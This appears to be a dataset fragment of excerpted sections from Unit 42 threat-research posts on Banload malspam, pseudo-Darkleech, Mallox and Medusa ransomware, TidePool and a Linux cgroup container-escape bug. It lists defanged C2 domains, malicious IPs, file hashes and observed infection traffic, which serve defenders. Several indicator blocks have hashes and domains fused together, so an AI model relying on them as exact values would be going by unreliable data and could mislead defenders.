Documents\n020f5692b9989080b328833260e31df7aa4d58c138384262b9d7fb6d221e36730d389a7b7dbdfdffcc9b503d0eaf3699f94d7a3135e46c65a4fa0f79ea263b4052985c6369571793bc547fc9443a96166e372d0960267df298221cd841b69545785398fedd12935e0ae5ac9c1d188f4868b2dc19fb4c2a13dab0887b8b3e220d941bcf18f7e841ea35778c971fc968317bee09f93ed314ce40815356a303a3ecba6f3581c5bcdbe7f23de2d8034aaf2f6dc0e67ff2cfe6e53cfb4d2007547b30df9f33892e476458c74a571a9541aebe8f8d18b16278f594a6723f813a147552925880cc833228999ea06bd37dd2073784ab234ea00c5c4d55f130fe43a0940b3e4937d06ac86078f96f07117861c734a5fdb5ea307fe7e19ef6458f91c1426416204cec5731f64be03ea766b75b8997aad14d4eb61b7248aa35fa6b1873398b64f22de7a1e2726a2c649de133fad2c6ad089236db1006ce3d247c39ee40f578c3b5503a0a89fd2eae9a77ff92eef69f08d68b963140b0a31721bb4960545e07d227cf53b29bf0a286e9c4a1e84a7d70b63a3c0ea81a6483fdfabd8fbccd52069190b1d3383c68bd0153c926e0ff3716b714eac81f6d125254054b277e3451fed321c8005be96a13affeb997b881eaba3e70167a7f0aa5d68eeb4d84520cca02d38de4250761cb877dfec40344c1642542ca41331af50fa914a9597f8cc0ee9b5a94e5736ead7ea46dbc95f11a3ca10ae86c8ae381d813975d71feddf14fc07abbdc9f02e7844817def006b9bdef1698412efb6e66346454307681134046e595\nIsSpace\n12d88fbd4960b7caf8d1a4b96868138e67db40d8642a4c21c0279066aae2f4291a6e3cd2394814a72cdf8db55bc3f781f7e1335b31f77bffc1336f0d11cf23d1\nC2 Domains\nwww.dppline[.]orgwww.matrens[.]top\nC2 Domains\neurope.wikaba[.]comrussiaboy.ssl443[.]orgcool.skywave[.]top\nSysget Version 2\n82f028e147471e6f8c8d283dbfaba3f5629eda458d818e1a4ddb8c9337fc0118\nC2 Domains\nnewtw2016.kr44.78host[.]com\nSysget Version 3\n02fc713c1b2c607dff4fc6c4797b39e42ee576578f6af97295495b9b172158b9a0b0a49da119d971fa3cf2f5647ccc9fe7e1ff989ac31dfb4543f0cb269ed105b49cb2c51bc2cc5e48585b9b0f7dd7ff2599a086a4219708b102890ab3f4daf3b8f9c1766ccd4557383b6643b060c15545e5f657d87d82310ed1989679dcfac4d75433833a3a4453fe35aaf57d8699d90d9c4a933a8457f8cc37c86859f62d1e685076708ace9fda65845e4cbb673fdd6f11488bf0f6fd5216a18d9eaaea1bbc7fcc86ebca81deab264418f7ae5017a6f79967ccebe8bc866efa14920e4fd909c5c3e8caffd1d416c1fd8947e60662d82638a3508dbcf95a6c9a2571263bdcef\nC2 Domains\ngtoimage[.]comtrend.gogolekr[.]com", "source": "Palo"}, {"title": "Indicators", "content": "Sysget Version 2\na768d63f8127a8f87ff7fa8a7e4ca1f7e7a88649fe268cf1bd306be9d80695642bf737f147e761586df1c421584dba350fd865cb14113eee084f9d673a61ee672c7c9fd09a0a783badfb42a491ccec159207ee7f65444088ba8e7c8e617ab5a5d91439c8faa0c42162ea9a6d3c282d0e76641a31f5f2fbc58315df9c0b90059c89d8d52c09dc09aeb41b1e9fafeacf1c038912d8c6b75ad4ef556707b15641ff6c1d56cb16f6342e01f4ebfc063db2244aef16d0a248332348dcdb31244d32f29c66232061fbb08088a3b680b4d0bffbbce1ce01d0ce5f0c4d8bf17f42d45682b138ea2e9b78568ebd9d71c1eb0e31f9cf8bc41cd5919f6522ef498ffcc8762a8830400c6a6d956309ac9bcbcceee2d27ba8c89f9d89f4484aba7d5680791459bda66f13202cef8cfb23f36ac0aee5c23f82930e1f38e81ba807f5c4e46128e3e8197e711018afd25a32dc364a9155c7e2a0c98b3924dc5f67b8cd2df16406ffe9c0838e2433a86bc2dec56378bd59627d6332ffb1aec252f5117938d00d9f74c63685b2497e384885e4b4649428d665692e8e6981dad688e8543110174f853b2c9c2bfea64dd95495703fcec59ad4cf74c43056b40ed96d40db9b919cfd050b94850525ea9467ae772c657c3b8c72663eaa28b2c995b22a12b09e4cacecad6de8bd20e3d8491497ca2d6878b41fb7be67abb97ee272ef8b6735faa6acd67777\nC2 Domains\nhello.newtaiwan[.]topbullskingdom[.]commail.googleusa[.]topwww.modelinfos[.]commodelinfos[.]comwww.sanspozone[.]com\nSysget Version 3\nf9a1607cdcfd83555d2b3f4f539d3dc301d307e462a999484d7adb1f1eb9edf67f286fbc39746aa8feeefc88006bedd83a3176d2235e381354c3ea24fe33d21c3b554ef43d9f3e70ead605ed38b5e66c0b8c0b9fc8df16997defa8e52824a2a68d7406f4d5759574416b8e443dd9d9cd6e24b5e39b1f5bc679e4a1ad54d409c6edf32cb7aad7ae6f545f7d9f11e14a8899ab0ac51b224ed36cfc0d367daf5785db19b9062063302d938bae51fe332f49134dc2e1947d980c82e778e9d7ca0616cde217acb6cfe20948b37b16769164c5f384452e802759eaabcfa1946ea9e18b9bee4f8674ee067159675f66ca8d940282b55fd1f71b8bc2aa32795fd55cd17e39539eb972de4e5fe525b3226f679c94476dfc88b2032c70e5d7b66058619075c45145ca9af7f21fff95c52726ff82595c9845b8e9d0dbf93ffe98b7a6fa8ee955325e9fccbdada83279e915e5aeb60d7b117f154fa2c3a38ec686d2552b1ebc2c7d29da1b5468b49a4aef31eee6757dc5c3627bf2fbfb8e01dec12aed34736a16dc75cf16d582eac6cbbe67b048a31fffa2fb525a76c5794dad7d751793c41091eee738f99174461b9a4085ea70ddafc0997790e7e5d6d07704dcbbc72dc8bf4a702ffbf01913cc3981d9802c075160dfd1beed3ba0681153d17623f781f53fe8bed52c58759e715d2a00bdb8a69e7e93def8d4f83d95986da21a549f4d51c5ed5598716de2129915f427065f0a22f425f4087584e1fa176c6de6ad141889d1adc86af1c03081482fe9ba9d8a8ae875d7217433164d54e40603e422451a2b90f0540148768247ed001f3894cdfa52d8e40b17d38df0f97e040a49baa3f5c92ece38a6e4f15b9986474c5d7c8a6e8b0826330f0135e1da087aae9eab60ea667a5c4e98922e6981cf2a801674d7e79a573ebcdc9ebc875ef929511f585b9c47814880b43ddc8466d910b7b49b6779970c38ce095983cad110fa924b41f249f89876b6f0359a3380943fece13033b79dc586706b8348a270ac71b589a5fd5790a4feab16570c11ec713cfa952457502c7edd21643129c846609cb13cdc0ae4671ced9ca7c06aac7525da5af3d1806b32eeb1c1d8f14cc31382ca52a14ed62f00a9a3aa4b3b3471b0bb5b2f61cbc8a94edef4988436e0bc55e9503173c836fb57a329ee56ca66187ece41c1525ad27969a4b850a45815057a31acee7cc76e97090965201380443210518621da9feb45756eac31213a21a81583cc158f8f65d50626cccb906d06aef1e33d12b8b09c233e575482228d40ac17232acad2557da4e53b\nC2 Domains\ngtoimage[.]comtrend.gogolekr[.comwww.bestfiles[.]top\nSysget Version 4\n2ac8bc678e5fa3e87d34aee06d2cd56ab8e0ed04cd236cc9d4c5e0fa6d303fa38dc539e3d37ccd522c594dc7378c32e5b9deeffb37e7a7a5e9a96b9a23df398e\nC2 Domains\nwww.sanseitime[.]com", "source": "Palo"}, {"title": "Introduction", "content": "For years now, criminals behind banking Trojans, remote access tools (RATs) and other types of malware have targeted Microsoft Windows hosts in Brazil through malicious spam (malspam). Antivirus often detects the associated malware as \"Banload,\" a family of Trojans that downloads other malware. We've identified 9,215 samples tagged \"Banload\" in AutoFocus since December 2013. Of these Banload samples, we've seen 2,132 samples during the first six months of 2017.\nFigure 1: Banload samples we've seen during the first six months of 2017.\nThe infection process has become increasingly complex. We've previously documented examples of Brazilian malspam from2015and2016that reveal a multi-stage infection process. As of 2017, this trend continues, and these criminals often abuse legitimate services like Google and Dropbox. We have notified both Google and Dropbox of the attacks we found so they can take appropriate action.\nThis blog post reviews a Brazilian malspam example from late June 2017.", "source": "Palo"}, {"title": "Conclusion", "content": "Google and Dropbox were notified of the malicious URLs from this infection traffic, and we have ensured Palo Alto Networks customers are protected against this traffic. A similar infection with matching characteristics was later noted in July 2017, and we expect this trend will continue.\nUsers located in Brazil or people who use Brazilian online banking services should be aware of this threat and take necessary precautions, such as not clicking links in suspicious emails. We will continue to investigate this activity for applicable indicators to inform the community and further enhance our threat prevention platform.", "source": "Palo"}, {"title": "Indicators", "content": "Traffic after clicking on the email link that downloaded the malicious zip archive:\nHTTPS via port 443 \u2013goo[.]gl- GET /htm4qG \nHTTPS via port 443 -googleapis[.]com- GET /pid/2via.html \nHTTP via port 80 -gov.br.impostocontribuinte[.]com- GET /Contribuinte/Iptu/ \nHTTPS via port 443 -dropbox[.]com- GET /s/ss6op2vxi3ggnhe/Notificacao%28Iptu-.-2017%29.zip?dl=1\nTraffic that occurred after double-clicking on malicious LNK file:\nHTTPS via port 443 -dropbox[.]com- GET /s/pqgwxrkcbqaonsy/sdar7hsy_2_.sct?dl=1 \nHTTPS via port 443 -dropbox[.]com- GET /s/vgq25no8a5zbb9b/gw4c9sql_1_.sct?dl=1 \nHTTP via port 80 - 192.252.1[.]11- GET /https/dv/ipv3.zip\nPost-infection traffic from the infected Windows host:\nHTTP via port 80 - 192.252.2[.]161- POST /ipv3/index.php\nAssociated file hashes:\nSHA256 hash:b42994352613e6bf63599dac0e2d4ddaf2b868842d5f04749f437f8335a63309\nFile name: Notificacao(Iptu-.-2017).zip \nFile description: Downloaded zip archive after clicking link from the malspam\nSHA256 hash:a4cf9811c55d0e4f2f8c783d1458ab3a5d69244287030a0a8154e89ed6ae02b0\nFile name: Notificacao(Iptu-.-2017).lnk \nFile description: Extracted Windows shortcut (LNK) file from the zip archive\nSHA256 hash:e7374e5ec576d95155c3b35d799656aba33315edbc9cdc7f0a04ed201135843a\nFile name: sdar7hsy_2_.sct \nFile description: Scriptlet (SCT) file returned after double-clicking the LNK file\nSHA256 hash:ed491c8d0b4ea30a3a4d78c2ee713d72b7ff4b1f90e04a86a775852953ade892\nFile name: gw4c9sql_1_.sct \nFile description: Another SCT file called from the first scriptlet\nSHA256 hash:94cf47c57413753ecc8c648384b475e96f13f8caca648b9240486340e1d91aa0\nFile name: ipv3.zip \nFile description: Follow-up malware downloaded by the above SCT file\nSHA256 hash:71eb0797db8de8ff5a9fe84b5568cd728b4b089537e4e1b5fd55b42de8b3fa07\nFile name: bxmmyDLr.exe \nFile description: G-Buster executable (GbpSv.exe) made persistent on the infected host\nSHA256 hash:faf0892be515437f9dfc86040e130533722b6149d65000969ebb334253cf4b89\nFile name: fltLib.dll \nFile description: Malicious DLL loaded by G-Buster executable.", "source": "Palo"}, {"title": "Introduction", "content": "In 2015, Sucuri published two blog posts, one in March describing apseudo-Darkleech campaigntargeting WordPress sites, and another aboutits evolutionthe following December. Sites compromised by this campaign redirected unsuspecting users to an exploit kit (EK). The Sucuri posts describe patterns in the injected script related to this campaign. Since December 2015, patterns associated with pseudo-Darkleech have continued to evolve. Our blog post today will examine these changes.\nHowever, before we look at the recent developments, we should understand how EKs fit into the overall picture and review the history of Darkleech.", "source": "Palo"}, {"title": "Conclusion", "content": "Since it was first called pseudo-Darkleech by Sucuri in March 2015, members of the security community have found websites compromised through this campaign on a daily basis. Withtens of thousands of compromised sites reported in 2013under the original Darkleech banner, pseudo-Darkleech continues the onslaught with no signs of slowing down.\nIn recent weeks, this campaign has led to Angler EK delivering a ransomware payload, especially TeslaCrypt. Pseudo-Darkleech and the associated Angler EK traffic remain a persistent and evolving threat. Both Darkleech and Angler frequently change patterns to avoid detection. Palo Alto Networks researchers have alreadyexamined Angler EK and published an in-depth reportcontaining indicators in January 2016. We continue to investigate pseudo-Darkleech and Angler EK for applicable indicators to inform the community and further enhance our threat prevention platform.", "source": "Palo"}, {"title": "Indicators", "content": "Domains and IP addresses from websites compromised through this campaign are continually changing. Below are recent examples of the injected script caused by pseudo-Darkleech that have been isolated and posted to Pastebin:\n2015-10-13 - http://pastebin.com/XCe7ZHz8 \n2015-12-16 - http://pastebin.com/DrUtXgxM \n2016-02-05 - http://pastebin.com/Knz2bYR0 \n2016-02-24 - http://pastebin.com/K053dSti \n2016-02-29 - http://pastebin.com/EcHHmu0p \n2016-03-07 - http://pastebin.com/zmjRguGW \n2016-03-14 - http://pastebin.com/QWb09vJJ", "source": "Palo"}, {"title": "Introduction", "content": "Back in February, I wrote apieceon the major runC vulnerability, CVE-2019-5736. The fundamental flaw behind this vulnerability affected most container runtimes, such as LXC and Apache Mesos. One container runtime which seemed to be unfazed wasCoreOS rkt, on which I heard a lot back when I first started to get into containers. So naturally, I was intrigued to check out rkt's architecture and see what they did differently, and I recently had some time to do so.\nI ended up finding 3 other, unrelated vulnerabilities in rkt. These vulnerabilities allow an attacker to compromise the host when a rkt user executes the 'rkt enter' command (the equivalent of 'docker exec') into an attacker-controlled pod. They are currentlyunpatched.", "source": "Palo"}, {"title": "Introduction", "content": "It is common for legitimate mobile apps to embed advertising SDKs or promote other apps. Showing ads or promoting other apps can generate revenue for legitimate app developers. However, we have recently observed an alarming trend in mobile ads communities where some adware programs in the Google Play store have become more aggressive by abusing the third-partyDroidPlugin frameworkon Android.\nIn this posting we will outline how Unit 42 researchers have found aggressive adware that abuses the third-partyDroidPlugin frameworkon Android. Our researchers have worked with Google to share our findings and have all apps that were found to violate Google's terms of service removed from the Google Play store.", "source": "Palo"}, {"title": "Conclusion", "content": "The Android plugin technology makes it possible for adware authors to make a profit in a new way. This kind of abuse is harmful to ad networks as well as Android users. We hope that the mobile development community and the security community will work together to solve security problems in the Android Plugin technology.  Android users should learn that the private data of their plugin apps and their devices are at great risk when operating in an Android Plugin environment.\nCustomers of Palo Alto Networks are protected by our WildFire and URL filtering services. WildFire has successfully detected adware samples, which abuse the Android plugin technology. The related C2 URLs used by above two adware families have been marked as malicious.", "source": "Palo"}, {"title": "Introduction", "content": "Mallox (aka TargetCompany, FARGO and Tohnichi) is a ransomware strain that targets Microsoft (MS) Windows systems. It has been active since June 2021, and is notable for exploiting unsecured MS-SQL servers as a penetration vector to compromise victims' networks.\nRecently, Unit 42 researchers have observed an uptick of Mallox ransomware activities \u2013 with an increase of almost 174% compared to the previous year \u2013 exploiting MS-SQL servers to distribute the ransomware. Unit 42 incident responders have observed Mallox ransomware using brute forcing, data exfiltration and tools such as network scanners. In addition, we have found indications that the group is working on expanding their operations and recruiting affiliates on hacking forums.\nPalo Alto Networks customers receive protections from Mallox ransomware and the techniques discussed in this blog throughCortex XDR, which provides a multilayer defense that includes behavioral threat protection and exploit protection.\nVideo showing Cortex preventing the execution of the Mallox ransomware.\nTheAdvanced WildFirecloud-delivered malware analysis service accurately identifies samples related to Mallox as malicious.Cloud-Delivered Security Services, includingAdvanced URL FilteringandDNS Securityidentify domains associated with this group as malicious.\nIf you believe you have been compromised, theUnit 42 Incident Response teamcan provide a personalized response.", "source": "Palo"}, {"title": "Conclusion", "content": "The Mallox ransomware group has been more active in the past few months, and their recent recruiting efforts may enable them to attack more organizations if the recruitment drive is successful.\nOrganizations should implementsecurity best practicesand be prepared to defend against theongoing threat of ransomware. This is true not only for Mallox ransomware but for other opportunistic criminal groups as well.\nThe Unit 42 team recommends making sure that all internet-facing applications are configured properly and all systems are patched and up to date wherever possible. These measures will help to reduce the attack surface, thereby limiting the exploitation techniques available to attackers.\nDeploy an XDR/EDR solution to perform in-memory inspection and detect process injection techniques. Perform threat hunting, looking for signs of unusual behavior related to security product defense evasion, service accounts for lateral movement and domain administrator-related user behavior.", "source": "Palo"}, {"title": "Indicators", "content": "SHA256 hashes for Mallox ransomware samples:\n6c743c890151d0719150246382b5e0158e8abc4a29dd4b2f049ce7d313b1a330 \nb03f94c61528c9f3731a2e8da4975c072c9ed4e5372d3ec6b0939eebe01e54a4 \nde9d3e17555e91072919dc700dc7e588cd52617debcad2f764ef9c7fbf6c9f7b \n2a549489e2455a2d84295604e29c727dd20d65f5a874209840ce187c35d9a439 \n1c8b6d5b79d7d909b7ee22cccf8f71c1bd8182eedfb9960c94776620e4543d13 \n36269d1892283991a9db23492cd8efcd68af74060384b9686219a97f76a9989e \n10eea0c13fd1a782c065627e23e7051edc1622f2eae5fbe138725369c12f4b6d \nDf30d74ab6600c1532a14c53a7f08f1afd41ec63cf427a4b91b99c3c2524caba \n0463277782f9e98b0e7a028cea0f689a81cf080fa0d64d4de8ef4803bb1bf03a \n1f793f973fd906f9736aa483c613b82d5d2d7b0e270c5c903704f9665d9e1185 \ne284ad63a832123240bd40b6c09565fae8525c00ddf308d5b8f5c8ce69ed6b09 \ne3a0bbd623db2b865fc3520c8d05e8b92016af2e535f0808460295cb8435836a \n7c84eafb3b05f0d5316fae610d9404c54ef39383d0fe0e3c07407a26bb9f6750 \n1276786fc51f3b7e987aa95ebff0a3e1e358ee4e86e2302e472f84710271af7b \nf730e83049c7fe81f6e4765ab91efbb7a373751d51fdafe697a4977dc7c1ea11 \n05194b34f8ff89facdd7b56d05826b08edaec9c6e444bdc32913e02cab01afd4 \nc599bebc9ae54a54710008042361293d71475e5fbe8f0cbaceb6ee4565a72015 \n060ed94db064924a90065a5f4efb50f938c52619ca003f096482353e444bd096 \n90be90ad4fb906574f9e7afe587f0826a71152bfc32cfc665a58877562f2edd4 \n1b2727af9fc187cd5c932c6defe50b983ad7508b4196ad6c5ff5e96686277c56 \na9543bc9612276863fc77b663fa3ff6efb85db69a01baa86c6dfabf73684b5c1 \n4e00f3e0e09d13e76da56009173098eefafc4ad50806583d5333990fa44e6420 \n6c109d098a1f44017f3937a71628d9dbd4d2ca8aa266656ee4720c37cc31558e \n7f8f1afa1390246409263e606aa05e2896b8d1da7018c534e67ca530a59ebda1 \n8e54c38bc3585c3163c3e25d037bcf55695c274aaea770f2f59f0a0910a4b572 \n724aa6dae72829e9812b753d188190e16fb64ac6cd39520897d917cfdccc5122 \n7164ba41639c8edcd9ff1cf41a806c9a23de566b56a7f34a0205ba1f84575a48 \n0e1c7ea4148e7473e15a8e55413d6972eec6e24ef365e9f629884f89645de71a \n4ed74a205fad15c843174d7d8b30ae60a181e79f31cc30ebc683072f187e4cdd \nee6fd436bf5aff181e3d4b9a944bf644076e902a1bbf622978b5e005522c1f77 \nebdcf54719cceddffc3c254b0bfb1a2b2c8a136fa207293dbba8110f066d9c51 \n9a3050007e1c46e226e7c2c27d4703f63962803863290449193a0d0ca9661b3b \nd6c51935d0597b44f45f1b36d65d3b01b6401593f95cb4c2786034072ad89b63 \n586d4f86615cb3a8709ae1c08dde35087580814c1d1315af3d7b932639ff48e0 \n8e974a3be94b7748f7971f278160a74d738d5cab2c3088b1492cfbbd05e83e22 \n3fa36079fdc548db1b5122450c2e4c9e40c37059de116d1c03f6459b13fc2dc4 \nD15f12a7cf2e8ec3d6fceabfab64956c7e727caab91cff9c664f92b5c8552570 \n0427a9f68d2385f7d5ba9e9c8e5c7f1b6e829868ef0a8bc89b2f6dae2f2020c4 \n4cbac922af3cfaba5fa7a3251bd05337bffd9ed0ada77c55bb4f78a041f4ebf2 \n10f96f64659415e46c3f2f823bdb855aab42d0bfced811c9a3b72aea5f22d880 \n5ccff9af23c18998221f45396732539d18e330454327d1e7450095c682d8c552 \n77fdce66e7f909300e4493cbe7055254f7992ba65f9b7445a6755d0dbd9f80a5 \nee08e3366c04574f25909494ef276e65e98d54f226c0f8e51922247ca3cfade9 \n2fd3c8fab2cfaaabf53d6c50e515dd5d1ef6eceeebdd5509c23030c4d54cb014 \n603846d113ef1f588d9a3a695917191791fbad441f742bcfe797813f9fc5291e \na5085e571857ec54cf9625050dfc29a195dad4d52bea9b69d3f22e33ed636525 \n9b833d5b4bdbc516e4773c489ced531b13028094ce610e96ebc30d3335458a97 \nb9e895830878124e20293f477549329d4d8752ff118f4fe893d81b3a30852c0b \ncd80506f971b95b3b831cef91bb2ec422b1a27301f26d5deac8e19f163f0839a \nc0e35b19f97021416e3724006511afc95d6aa409404e812d8c62b955bc917d3c \n342930d44aed72f826a3f0f4a3964158f2bd86fb53703fb3daa6c937b28a53e4 \n9ee35c6eb97230cd9b61ba32dba7befea4122f89b3747d2389970050a1d019f9 \ne7e00e0f817fcb305f82aec2e60045fcdb1b334b2621c09133b6b81284002009 \ne3f63ab8ef91e0c52384c0e3e350db2427c8cb9237355800a3443b341cf8cf4f \nf7e8a0eac54dd040e2609546fca263f2c2753802ff57e7c62d5e9ccfa04bdb1a \ne7178a4bad4407316b85894307df32fdf85b597455364eb8ec4d407749e852ce\nSHA256 hashes for PowerShell scripts Updt.ps1 and Upddt.ps1\ndcc9e23fd6ac926eb9ee7e0ee422dacd2059b4a42c8642d32bdf4f5c8eb33f6a \nfead3d518752ddb4d2407f16ca5f3c9b3c0bf01972a2618369d02913f7c6af1a \n0901a9920c9f0c74fb2170524477693d62c8493715520ae95143abd8055e7a39 \nba97fd533e8a552664695434227b24ca1e2e661c360a7a0a40ff59ba6b8fe949 \n53da732df7599f5ad21a26b669500788a827f3a8358dcdca10997d2b8187c95c \n189c9c4603defb14fa8c942f5ff7814804654269917640478686530f91c4b66c \nfd0030883b9e74b383ee6381a2aaa7e2e5b93a00003b555e2f7c8b7be65ab176 \nd22b3218c4b7f13fe114854d1dbda02c3ad94a1b6c69daa1cf6a504ada8b8bca \nb6447b0636085fcb41fd574e84500958f21dfe87fe06b0813fb9399d63f28851 \n5c34f6fa6eada3197404bf95eced9d288688537598629158a4f4e18d6882cb9b \nd81b0425d4ec49bad194b8dc750524c2a29994fe972e733376349f47961cfa62\nSystem.bat\n1e2515efb64200258752d785863fd35df6039441a80cb615dfff4fbdffb484ec \n777a5782426e5b42e0e5e8445dd9602d123e8acc27aca4daa8e9c053f3d5b899 \n9e3684be0b4c2dc93f962c03275e050fed57d9be6411396f51bdf8d4bb5e21c0 \ncb47327c7cce30cff8962c48fa3b51e57e331e1592ea78b21589164c5396ccd9\nIP addresses related to Mallox ransomware activity\n103.96.72[.]140 \n80.66.75[.]36 \n80.66.75[.]37 \n80.66.75[.]126 \n80.66.75[.]116 \n92.118.148[.]227 \n62.122.184[.]113 \n87.251.64[.]245 \n119.3.125[.]197 \n49.235.255[.]219 \n80.66.75[.]55 \n87.251.67[.]92 \n121.4.69[.]26 \n124.223.11[.]169 \n45.93.201[.]74 \n80.66.75[.]135 \n194.26.135[.]44 \n80.66.75[.]51 \n89.117.55[.]149 \n5.181.86[.]241 \n185.170.144[.]153", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 Threat Intelligence analysts have noticed an escalation in Medusa ransomware activities and a shift in tactics toward extortion, characterized by the introduction in early 2023 of their dedicated leak site called the Medusa Blog. Medusa threat actors use this site to disclose sensitive data from victims unwilling to comply with their ransom demands.\nAs part of their multi-extortion strategy, this group will provide victims with multiple options when their data is posted on their leak site, such as time extension, data deletion or download of all the data. All of these options have a price tag depending on the organization impacted by this group.\nBesides their strategy of using an onion site for extortion, Medusa threat actors also leverage a public Telegram channel named \"information support,\" where files of compromised organizations have been shared publicly and are more accessible than traditional onion sites.\nThe Unit 42 Incident Response team has also responded to a Medusa ransomware incident, which has allowed us to uncover interesting tactics, tools and procedures used by Medusa threat actors.\nPalo Alto Networks customers are better protected against ransomware used by the Medusa ransomware group throughCortex XDR, as well as from theWildFireCloud-Delivered Security Servicesfor theNext-Generation Firewall. In particular, the Cortex XDR agent included out-of-the-box protections that prevented adverse behavior from Medusa ransomware samples we tested without the need for specific detection logic or signatures.Prisma CloudDefender Agents can monitor Windows virtual machine instances for known Medusa malware.Cortex Xpansecan be used to detect vulnerable services exposed directly to the internet that may be exploitable and infected with Medusa or other ransomware.\nTheUnit 42 Incident Response teamcan also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "The emergence of the Medusa ransomware in late 2022 and its notoriety in 2023 marks a significant development in the ransomware landscape. This operation showcases complex propagation methods, leveraging both system vulnerabilities and initial access brokers, while adeptly avoiding detection through living-off-the-land techniques.\nThe Medusa Blog signifies a tactical evolution toward multi-extortion, with the group employing transparent pressure tactics on victims through ransom demands publicized online. With 74 organizations across a spectrum of industries affected to date, Medusa's indiscriminate targeting emphasizes the universal threat posed by such ransomware actors.\nTechnical analysis by Unit 42 researchers reveals the nuanced exploitation strategies employed by the Medusa ransomware group, from webshell placement on compromised servers to the deployment of encrypted kernel drivers. This culminates in a novel application of netscan tools and Medusa's gaze leading to file encryption using the ominous.medusafile extension. As such, Medusa ransomware stands as a significant threat to organizations, demanding a more proactive and strong defensive strategy.", "source": "Palo"}, {"title": "Introduction", "content": "Little has been published on the threat actors responsible forOperation Ke3changsince the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We've discovered a new malware family we've named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India.\nThough we don't have comprehensive targeting information, the spear phishing emails we found targeted several Indian embassies in different countries. One decoy references an annual report filed by over 30 Indian embassies across the globe. The sender addresses of the phishing emails spoof real people with ties to Indian embassies, adding legitimacy to the emails to prompt the recipients to open the attached file. Also noteworthy, the actors are exploiting a relatively new vulnerability in their attacks with TidePool, which is detailed below.\nIn this report we will highlight the reuse of the code responsible for a variety of registry changes and command and control traffic over time as the Ke3chang actor has evolved their codebase to TidePool since the 2013 report.", "source": "Palo"}, {"title": "Conclusion", "content": "Despite going unreported on since 2013, Operation Ke3chang has not ceased operations and in fact continued developing its malware. Unit 42 was able to track the evolution of Operation Ke3chang's tools by observing unique behavioral quirks common throughout the malware's lineage. By pivoting on these behaviors in AutoFocus, we were able to assess a relationship between these families dating back to at least 2012 and the creation of TidePool, a new malware family continuing in Ke3chang's custom malware footsteps. While we can't know all of the groups' attacks using TidePool or older malware, we have uncovered its use against Indian Embassies, which was also documented in the 2013 report, indicating this is likely a high priority target as it has continued over multiple years.\nCustomers can utilize theKe3changResurfaces AutoFocus tagto examine the samples discussed in this post. IPS coverage for TidePool is provided by TID 14588.", "source": "Palo"}, {"title": "IOC", "content": "Phishing emails:\n4d5e0eddcd014c63123f6a46af7e53b5ac25a7ff7de86f56277fe39bff32c7b5\n1896d190ed5c5d04d74f8c2bfe70434f472b43441be824e81a31b7257b717e51\nde5060b7e9aaaeb8d24153fe35b77c27c95dadda5a5e727d99f407c8703db649\nWeaponized document attachments:\n785e8a39eb66e872ff5abee48b7226e99bed2e12bc0f68fc430145a00fe523db\neea3f90db41f872da8ed542b37948656b1fb93b12a266e8de82c6c668e60e9fc\nTidePool Dropper:\n38f2c86041e0446730479cdb9c530298c0c4936722975c4e7446544fd6dcac9f\nTidePool dlls:\n67c4e8ab0f12fae7b4aeb66f7e59e286bd98d3a77e5a291e8d58b3cfbc1514ed\n2252dcd1b6afacde3f94d9557811bb769c4f0af3cb7a48ffe068d31bb7c30e18\n9d0a47bdf00f7bd332ddd4cf8d95dd11ebbb945dda3d72aac512512b48ad93ba\nC2 domain:\ngoback.strangled[.]net", "source": "Palo"}, {"title": "Introduction", "content": "On Feb. 4, Linux announcedCVE-2022-0492, a new privilege escalation vulnerability in the kernel. CVE-2022-0492 marks a logical bug in control groups (cgroups), a Linux feature that is a fundamental building block of containers. The issue stands out as one of the simplest Linux privilege escalations discovered in recent times: The Linux kernel mistakenly exposed a privileged operation to unprivileged users.\nFortunately, the default security hardenings in most container environments are enough to prevent container escape. Containers running with AppArmor, SELinux or Seccomp are protected. That being said, if you run containers without best practice hardenings, or with additional privileges, you may be at risk. The\"Am I Affected?\"section lists vulnerable container configurations and provides instructions on how to test whether a container environment is vulnerable.\nUnit 42 recommends users upgrade to a fixed kernel version. For those running containers, enable Seccomp and ensure AppArmor or SELinux are enabled. Prisma Cloud users can refer to the\"Prisma Cloud Protections\"section for the mitigations provided by Prisma Cloud.\nCVE-2022-0492 is now the thirdkernel vulnerability in recent monthsthat allows malicious containers to escape. In all three vulnerabilities, securing containers with Seccomp and either AppArmor or SELinux was enough to prevent container escape.\nUpdated March 7, 2022:Removed mentions of exploitation by (1) containers running withCAP_SYS_ADMINand not protected by AppArmor or SELinux, and (2) semi-privileged host processes. While those can exploit CVE-2022-0492 to escalate privileges, they often have other avenues to escalate privileges that don't require a vulnerability.", "source": "Palo"}, {"title": "Background", "content": "Control groups (cgroups) are a Linux feature that allows administrators to limit, account for and isolate the resource usage of a collection of processes. Linux supports two cgroup architectures called v1 and v2. The new vulnerability only affects cgroup v1, which is currently the more widely used architecture by far. The rest of this section will only refer to cgroup v1.\nCgroups are managed via cgroupfs, a management API exposed as a filesystem and normally mounted under/sys/fs/cgroup. By creating and writing to files and directories in a mounted cgroupfs, administrators can create cgroups, control the constraints imposed on a cgroup, add processes to a certain cgroup and so on.\nCgroups are divided into subsystems, each configuring access to a different resource. The memory cgroup for example, can limit the memory consumption of a collection of processes. The device cgroup defines which devices (e.g. the hard drive, or the mouse) can be accessed by processes in the cgroup. Other examples for subsystems include block IO, CPU and remote direct memory access (RDMA).\nEach subsystem is typically mounted at/sys/fs/cgroup/<subsystem>, which is considered the root cgroup for the subsystem. Any subsequent directories under the root cgroup denote a new child cgroup. A Docker container, for example, would normally be a part of the/docker/<ctr-id>cgroup, which could be found on the host at/sys/fs/cgroup/<subsystem>/docker/<ctr-id>. Figure 1 shows the cgroup membership of a Docker container, and Figure 2 shows the cgroup membership of a Kubernetes pod.\nAs seen in the screenshots above, not all hosts are configured to support the same subsystems. Docker and Kubernetes also have a variety of cgroup configurations, so containers on your hosts or clusters may not have the same memberships as in the examples above.", "source": "Palo"}, {"title": "Conclusion", "content": "CVE-2022-0492 marks another Linux vulnerability that can be exploited for container escape. Fortunately, environments that follow best practices are protected from this vulnerability. Environments with lax security controls hosting untrusted or publicly exposed containers are, unsurprisingly, at high risk. As always, it's best to upgrade your hosts to a fixed kernel version.\nWe strongly recommend running containers with Seccomp and either AppArmor or SELinux enabled, 